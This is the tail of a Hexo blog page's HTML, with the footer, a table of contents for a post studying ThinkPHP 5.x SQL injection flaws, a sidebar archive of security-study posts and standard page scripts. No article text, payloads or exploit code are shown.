+                                    
+                                        
+
+                                            <!-- 评论 -->
+
+                                            <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+                                            
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:R0ser1@foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-ParseData-%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">ThinkPHP ParseData 方法注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-ParseArrayData-%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">ThinkPHP ParseArrayData 方法注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81-1"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-ParseWhereItem%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5%E4%B8%80"><span class="toc-number">4.</span> <span class="toc-text">ThinkPHP ParseWhereItem方法注入一</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81-2"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">4.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-ParseWhereItem%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5%E4%BA%8C"><span class="toc-number">5.</span> <span class="toc-text">ThinkPHP ParseWhereItem方法注入二</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81-3"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-number">5.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-orderby-%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">ThinkPHP orderby 方法注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="toc-number">6.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">ThinkPHP 聚合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81-4"><span class="toc-number">7.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5"><span class="toc-number">7.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="toc-number">7.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="toc-number">7.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-5-0-9%E9%B8%A1%E8%82%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">ThinkPHP 5.0.9鸡肋注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81-5"><span class="toc-number">8.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%80%9D%E8%80%83"><span class="toc-number">8.2.</span> <span class="toc-text">关于这个漏洞的一些简单思考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+    
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 14
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2021/08/03/ThinkPHP5-x%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" >ThinkPHP5.x注入漏洞学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2021/07/29/Wordpress-4-9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" >Wordpress<= 4.9.6任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2021/07/29/ThinkPHP3-2%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" >ThinkPHP3.2注入漏洞学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2021/07/21/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >PHPCMSV9版本代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/2021/07/21/DedeCMS%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >DedeCMS历史版本代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2021/07/20/%E5%AE%89%E5%8D%93%E6%97%A0%E6%B3%95%E6%8A%93%E5%8F%96HTTPS%E9%97%AE%E9%A2%98/" >安卓无法抓取HTTPS问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/" >Mysql注入技巧备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/" >Tryhackme记录liunx提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Volatility/" >Volatility</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2021/05/17/Mysql-Join%E6%B3%A8%E5%85%A5/" >Mysql_Join注入技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/" >XSS一些记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2021/05/12/DNSlog%E6%B3%A8%E5%85%A5/" >DNSlog注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" >CTF反序列字符串逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/" >Meterpreter后渗透</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="meterpreter"><span class="iconfont-archer">&#xe606;</span>meterpreter</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="杂七杂八"><span class="iconfont-archer">&#xe606;</span>杂七杂八</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "R0ser1"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
